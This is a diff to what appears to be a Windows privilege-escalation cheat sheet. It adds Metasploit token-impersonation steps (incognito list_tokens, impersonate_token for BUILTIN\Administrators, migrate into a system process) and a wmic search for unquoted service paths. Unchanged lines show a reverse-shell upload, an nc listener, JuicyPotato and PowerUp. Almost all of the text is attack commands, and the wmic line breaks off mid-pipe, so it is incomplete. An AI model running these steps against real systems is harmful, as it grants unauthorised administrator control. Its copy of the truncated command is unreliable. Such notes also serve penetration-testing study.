@@ -82,6 +82,8 @@ with spaces which is write-able.
     ;; verify which part of the unquoted path is write-able by our users with accesschk
     accesschk.exe /accepteula -uwcqv "<path>" ;; check for something like BUILTIN/Users
     accesschk.exe /accepteula -uwcqv "<path>\<other_part>" ;; check for something like BUILTIN/Users
+    ;; we can also manually search for unquoted paths by using wmic
+    wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v 
 
 ;; upload the reverse shell
 net stop <servicename>
@@ -482,21 +484,51 @@ nc -lnvp <port>
 C:\Windows\Temp\JuicyPotato.exe -p revshell.exe -a "/c whoami > C:\Users\Public\morph3.txt" -t * -l 1031 -c {d20a3293-3341-4ae8-9aaf-8e397cb63c34}
 
 
+# Metasploit Privilege Escalation
+Metasploit basically uses the techniques we have seen
+But on older Windows versions it also tries additional privilege
+escalation strategies with the `getsystem` meterpreter command.
+
+In addition the meterpreter module called "incognito" can be
+used to enumerate tokens for a user and check if we can impersonate
+a more privilged user.
+
+## Metasploit (meterpreter incognito)
+meterpreter > load incognito ;; or use incognito
+
+;; List all tokens
+meterpreter > list_tokens -g
+
+If the BUILTIN\Administrators token is available, then the game is done!
+We can just input:
+meterpreter > impersonate_token "BUILTIN\Administrators" 
+
+;; now we have impersonated the Administrators token and we can test this
+;; by doing
+meterpreter > getuid
+
+;; Even though you have a higher privileged token you may not actually have
+;; the permissions of a privileged user (this is due to the way Windows
+;; handles permissions - it uses the Primary Token of the process and not
+;; the impersonated token to determine what the process can or cannot
+;; do). Ensure that you migrate to a process with correct permissions
+meterpreter > migrate <PID_of_some_system_process_that_is_stable_such_as_services.exe>
+
+
+# Other Helpful Tools for Privesc Enumeration
 
 # PowerShellMafia
-# https://morph3sec.com/Cheat-Sheets/Windows-Red-Team-Cheat-Sheet/
-# Use always dev branch others are shit.
-https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1
+;; https://morph3sec.com/Cheat-Sheets/Windows-Red-Team-Cheat-Sheet/
+;; Use always dev branch others are shit.
+;; https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1
 powershell.exe -c "Import-Module C:\Users\Public\PowerUp.ps1; Invoke-AllChecks"
 powershell.exe -c "Import-Module C:\Users\Public\Get-System.ps1; Get-System"
 
 # Sherlock
-https://github.com/rasta-mouse/Sherlock
+;; https://github.com/rasta-mouse/Sherlock
 
 # PowerUp
 ;; powerup checks for common Windows privilege escalation vectors that rely on misconfigurations
 . .\PowerUp.ps1
 Invoke-AllChecks
 
-# Get Unquoted paths
-wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v 
